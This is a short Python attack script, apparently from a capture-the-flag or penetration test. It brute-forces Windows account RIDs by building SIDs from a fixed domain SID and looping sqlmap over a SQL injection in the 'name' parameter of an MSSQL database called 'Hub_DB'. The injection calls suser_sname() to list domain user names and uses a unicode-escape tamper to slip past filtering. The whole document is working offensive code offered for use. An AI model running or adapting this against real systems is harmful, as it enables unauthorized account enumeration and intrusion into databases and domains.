import requests
import struct
import os

base = "0x0105000000000005150000001c00d1bcd181f1492bdfc236"

offset = 500
for i in range(1000):
    t = "{:08x}".format(i+offset)
    p = t[6:] + t[4:6] + t[2:4] + t[0:2]
    p = base+p
    if not(i % 10):
        print(p)
    os.system("sqlmap --batch -r r.txt -p name -D 'Hub_DB' --dbms=mssql --technique=U --delay=3 --tamper=charunicodeescape --sql-query=\"select suser_sname(" + p + ");\" | grep '^select suser_sname'")
